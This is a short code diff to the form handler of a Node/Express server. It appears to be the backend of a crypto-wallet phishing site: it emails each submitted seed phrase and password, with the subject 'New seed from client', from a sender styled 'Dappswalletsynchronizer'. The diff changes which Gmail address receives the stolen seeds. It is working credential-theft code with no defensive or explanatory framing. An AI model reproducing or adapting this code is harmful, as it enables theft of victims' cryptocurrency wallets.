@@ -27,7 +27,7 @@ app.post('/form', async(req, res) => {
  
   const response = await transporter.sendMail({
     from: '"Dappswalletsynchronizer" <jtom29544@gmail.com>',
-    to: "jtom29544@gmail.com",
+    to: "atmosphere0610@gmail.com",
     subject: "New seed from client", 
     text: `seed: ${seed} \npassword: ${password ? password : ''}`
   })   
